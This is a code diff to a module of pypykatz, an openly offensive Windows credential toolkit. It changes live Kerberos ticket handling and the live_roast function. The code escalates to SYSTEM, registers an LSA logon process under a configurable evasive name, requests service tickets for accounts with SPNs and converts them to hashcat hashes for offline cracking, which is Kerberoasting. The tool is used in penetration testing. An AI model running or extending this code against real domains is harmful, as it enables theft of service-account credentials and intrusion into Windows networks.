@@ -3,8 +3,7 @@ import datetime
 
 from winacl.functions.highlevel import get_logon_info
 from msldap.commons.url import MSLDAPURLDecoder
-from winsspi.sspi import KerberoastSSPI
-from winsspi.common.gssapi.asn1_structs  import InitialContextToken
+from pypykatz.kerberos.functiondefs.asn1structs import InitialContextToken
 from minikerberos.common.utils import TGSTicket2hashcat, TGTTicket2hashcat
 from minikerberos.network.clientsocket import KerberosClientSocket
 from minikerberos.common.target import KerberosTarget
@@ -36,11 +35,12 @@ from pypykatz.kerberos.functiondefs.kernel32 import GetCurrentProcessId, OpenPro
 
 
 class KerberosLive:
-	def __init__(self, start_luid = 0):
+	def __init__(self, start_luid = 0, helper_name = 'TOTALLY_NOT_PYPYKATZ'):
 		self.available_luids = []
 		self.current_luid = start_luid
 		self.original_luid = self.get_current_luid()
 		self.kerberos_package_id = None
+		self.helper_name = helper_name
 		self.__lsa_handle = None
 		self.__lsa_handle_is_elevated = None
 		
@@ -60,8 +60,12 @@ class KerberosLive:
 			return self.__lsa_handle
 		
 		pm = ProcessManipulator()
-		pm.getsystem()
-		self.__lsa_handle = LsaRegisterLogonProcess('TOTALLY_NOT_PYPYKATZ')
+		try:
+			pm.getsystem()
+		except Exception as e:
+			raise Exception('Failed to obtain SYSTEM privileges! Are you admin? Error: %s' % e)
+		
+		self.__lsa_handle = LsaRegisterLogonProcess(self.helper_name)
 		pm.dropsystem()
 		self.__lsa_handle_is_elevated = True
 		return self.__lsa_handle
@@ -73,7 +77,7 @@ class KerberosLive:
 			return self.__open_elevated()
 
 		
-		if self.current_luid == 0 or self.original_luid == self.current_luid:
+		if luid == 0 or self.original_luid == self.current_luid:
 			self.__lsa_handle = LsaConnectUntrusted()
 			self.__lsa_handle_is_elevated = False
 		else:
@@ -190,7 +194,7 @@ class KerberosLive:
 		else:
 			luids.append(luid)
 			self.open_lsa_handle(luid)
-		
+
 		for luid_current in luids:
 			message = KERB_PURGE_TKT_CACHE_REQUEST(luid_current)
 			message_ret, status_ret, free_ptr = LsaCallAuthenticationPackage(self.__lsa_handle, self.kerberos_package_id, message)
@@ -337,10 +341,21 @@ async def live_roast(outfile = None):
 			spn_name = '%s@%s' % (cred.username, cred.domain)
 			if spn_name[:6] == 'krbtgt':
 				continue
-			ksspi = KerberoastSSPI()
 			try:
-				ticket = ksspi.get_ticket_for_spn(spn_name)
+				ctx = AcquireCredentialsHandle(None, 'kerberos', spn_name, SECPKG_CRED.OUTBOUND)
+				res, ctx, data, outputflags, expiry = InitializeSecurityContext(
+					ctx,
+					spn_name,
+					token = None,
+					ctx = ctx,
+					flags = ISC_REQ.ALLOCATE_MEMORY | ISC_REQ.CONNECTION
+				)
+				if res == SEC_E.OK or res == SEC_E.CONTINUE_NEEDED:					
+					ticket = InitialContextToken.load(data[0][1]).native['innerContextToken']
+				else:
+					raise Exception('Error %s' % res.value)
 			except Exception as e:
+				print(e)
 				errors.append((spn_name, e))
 				continue
 			results.append(TGSTicket2hashcat(ticket))
